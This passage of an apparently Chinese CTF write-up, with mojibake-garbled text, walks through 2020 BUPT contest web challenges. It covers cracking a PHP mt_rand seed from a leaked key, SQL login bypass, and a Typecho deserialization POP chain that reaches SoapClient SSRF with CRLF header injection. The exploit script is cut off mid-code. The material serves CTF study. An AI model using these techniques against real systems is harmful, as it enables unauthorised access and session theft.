<p>$ipæ˜¯é€šè¿‡getIp()è·å–IPä½†å…·ä½“ä¸çŸ¥é“é€šè¿‡ä»€ä¹ˆåˆ¤æ–­çš„åªèƒ½çŒœäº†</p>
<p>1.Client-IP</p>
<p>2.X-Forwarded-For</p>
<p>3.X-Real-IP</p>
<p>å¯¹äºfile_get_contentså¯ä»¥åˆ©ç”¨<code>data://</code>ä¼ªåè®®ç»•è¿‡æˆ–è€…<code>php://input</code> ç»•è¿‡</p>
<p><code>change</code>æ”¹å˜äº†æˆ‘ä»¬ä¼ å…¥çš„fileå‚æ•°ï¼Œæ‰€ä»¥ä¼ å…¥å‰å…ˆåŠ å¯†file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dechage</span><span class="params">($v)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">print</span>(unchage($a));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411223358460.png" alt="image-20200411223358460"></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200328233109846.png" alt="image-20200328233109846"></p>
<h3 id="6-Ezaudit"><a href="#6-Ezaudit" class="headerlink" title="6.Ezaudit"></a>6.Ezaudit</h3><p>ç›´æ¥æ‰«ç›®å½•ï¼Œå‘ç°æºç </p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411225633366.png" alt="image-20200411225633366"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸»è¦æ˜¯è¦æ¯”è¾ƒè¿™ä¸ªç§é’¥ï¼Œé¢˜ç›®ç»™äº†å…¬é’¥ï¼Œå¯ä»¥å‘ç°ä»–ä»¬éƒ½æ˜¯<code>mt_rand()</code>ç”Ÿæˆçš„ã€‚æ‰€ä»¥åªè¦ç”¨å…¬é’¥å»è¿˜åŸç§å­ï¼Œç„¶åå†æ‰‹å·¥ç®—å‡ºç§é’¥å³å¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *str1 = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *str2 = <span class="string">"KVQP0LdJKRaV3n9D"</span>; <span class="comment">//å…¬é’¥</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str2) ; i++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(str1) ; j++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( str2[i] == str1[j] ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d %d 0 %d "</span>, j, j, <span class="built_in">strlen</span>(str1)<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“æœ</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>ç”¨php_mt_seedè·‘å‡ºç§å­ä¸º <code>1775196155</code></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411232419172.png" alt="image-20200411232419172"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line">$Public_key = public_key();</span><br><span class="line">$private_key = private_key();</span><br><span class="line"><span class="keyword">echo</span> $Public_key . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $private_key;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç§é’¥ <code>XuNhoueCDCGc</code>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯phpç‰ˆæœ¬å¤§ç‰ˆæœ¬è¦å’Œé¢˜ç›®ç¯å¢ƒç›¸åŒï¼Œä¸ç„¶å¾—å‡ºçš„ç§é’¥æ˜¯ä¸ä¸€æ ·çš„</p>
<p>æœ€åé€šè¿‡ä¸‡èƒ½å¯†ç æ‹¿åˆ°flag</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200411233744024.png" alt="image-20200411233744024"></p>
<h3 id="7-Ezpop-Revenge"><a href="#7-Ezpop-Revenge" class="headerlink" title="7.Ezpop_Revenge"></a>7.Ezpop_Revenge</h3><p>æ²¡å†™å‡ºæ¥ï¼Œå¤ç°å­¦ä¹ ä¸€ä¸‹</p>
<p>è¿˜æ˜¯<code>www.zip</code>æºç æ³„éœ²</p>
<p>flag.phpæš—ç¤ºåº”è¯¥è¦SSRF</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;******&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"æˆ‘æ‰Œyour problem?\nonly localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¥ç€æ‰¾ååºåˆ—çš„ä½ç½®</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412124013730.png" alt="image-20200412124013730"></p>
<p><code>Plugin.php</code>ä¸­å…³é”®çš„ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_Plugin</span> <span class="keyword">implements</span> <span class="title">Typecho_Plugin_Interface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">                unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–ä¼šè§¦å‘ <code>__wakeup()</code> å¹¶å®ä¾‹åŒ– <code>Typecho_Db</code>ç±»ï¼Œè·Ÿè¿›<code>/var/Typecho/Db.php</code></p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412131913212.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line">        $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line">        <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿæç¤ºäº† <code>__toString()</code> æ–¹æ³•ï¼Œæ¥ç€æœ</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412141521405.png" alt="image-20200412141521405"></p>
<p>åœ¨ <code>/var/Typecho/Db/Query.php</code> ä¸­<code>__toString</code>å¯è¢«åˆ©ç”¨ </p>
<p>å…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/** æ•°æ®åº“å…³é”®å­— */</span></span><br><span class="line">    <span class="keyword">const</span> KEYWORDS = <span class="string">'*PRIMARY|AND|OR|LIKE|BINARY|BY|DISTINCT|AS|IN|IS|NULL'</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $_default = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'action'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'table'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'fields'</span> =&gt; <span class="string">'*'</span>,</span><br><span class="line">        <span class="string">'join'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">        <span class="string">'where'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'limit'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'offset'</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'order'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'group'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'having'</span>  =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">        <span class="string">'rows'</span>   =&gt; <span class="keyword">array</span>(),</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Typecho_Db_Adapter $adapter, $prefix)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = &amp;$adapter;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = <span class="keyword">self</span>::$_default;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="string">' VALUES '</span></span><br><span class="line">                . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">                . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>ä¸ºSELECTï¼Œåœ¨<code>__toString()</code>æ–¹æ³•å†…å°±ä¼šè¿”å›<code>$this-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code>ï¼Œè°ƒç”¨äº†<code>$this-&gt;_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ã€‚</p>
<p><strong>POPé“¾é€»è¾‘ï¼š</strong></p>
<ul>
<li>ååºåˆ—åŒ–<code>HelloWorld_DB</code>ï¼Œå°±è§¦å‘äº†<code>__wakeup()</code>æ–¹æ³•ï¼Œåœ¨<code>__wakeup()</code>å†…å®ä¾‹åŒ–<code>Typecho_Db</code>å¹¶ä»¥<code>$this-&gt;coincidence[&#39;hello&#39;]</code>ä½œä¸º<code>Typecho_Db</code>çš„<code>__construct()</code>æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼›</li>
<li>PHPçš„æ•°ç»„æ˜¯å¯ä»¥å­˜å¯¹è±¡ï¼Œå‡è®¾<code>$this-&gt;coincidence[&#39;hello&#39;]</code>å®ä¾‹åŒ–<code>Typecho_Db_Query</code>å¯¹è±¡ï¼Œåœ¨<code>Typecho_Db</code>çš„æ„é€ æ–¹æ³•ä¸­å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²ï¼Œå°±è§¦å‘äº†<code>Typecho_Db_Query</code>çš„<code>__toString()</code>æ–¹æ³•ï¼›</li>
<li>åœ¨<code>__toString()</code>å†…ï¼Œå¦‚æœ<code>$_sqlPreBuild[&#39;action&#39;]</code>ä¸º<code>&#39;SELECT&#39;</code>å°±ä¼šè§¦å‘<code>$_adapter</code>çš„<code>parseSelect()</code>æ–¹æ³•ï¼›</li>
<li>å°†<code>$_adapter</code>å®ä¾‹åŒ–ä¸º<code>SoapClient</code>ï¼Œè°ƒç”¨<code>parseSelect()</code>æ˜¯ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘äº†<code>SoapClient</code>çš„<code>__call()</code>é­”æœ¯æ–¹æ³•</li>
<li><code>__call()</code>æ˜¯å®ç°SSRFçš„å…³é”®</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient::__call ( string $function_name , <span class="keyword">array</span> $arguments )</span><br></pre></td></tr></table></figure>

<p>æ¥ç€æ‰¾æ’ä»¶åœ¨å“ªé‡Œè°ƒç”¨äº†</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412151046867.png" alt="image-20200412151046867"></p>
<p><code>/var/Typecho/Plugin.php</code>ä¸­æœ‰æ¡è·¯ç”±</p>
<p><img src="/2020/03/2020åŒ—é‚®æ ¡èµ›/image-20200412195650568.png" alt="image-20200412195650568"></p>
<p>è®¿é—® <code>/page_admin</code>å³å¯å¯ç”¨æ’ä»¶</p>
<p>æƒ³è¦å¸¦SESSIONå‡ºæ¥ï¼Œå¿…é¡»è¦æŠŠè‡ªå·±çš„PHPSESSIDä¼ è¿‡å»ï¼Œç„¶è€ŒSOAPå¹¶ä¸èƒ½è®¾ç½®Cookieï¼Œå› æ­¤éœ€è¦CRLFã€‚SoapClientå¯ä»¥è®¾ç½®UAï¼Œåªè¦åœ¨UAååŠ ä¸Š<code>\r\nCookie: PHPSESSID=xxx</code>å°±èƒ½ä¸ºhttpå¤´æ·»åŠ ä¸€ä¸ªæ–°çš„Cookieå­—æ®µï¼Œè¿™æ ·å°±èƒ½å¸¦ä¸Šsessionäº†ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">            <span class="string">"Cookie: PHPSESSID=s8fo8ma30gbttqvgdbb48k6rw3"</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'uri'</span> =&gt; <span class="string">'hello'</span>, <span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span> =&gt; <span class="string">'test^^'</span> . join(<span class="string">'^^'</span>, $headers)));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">'action'</span> =&gt; <span class="string">"SELECT"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span 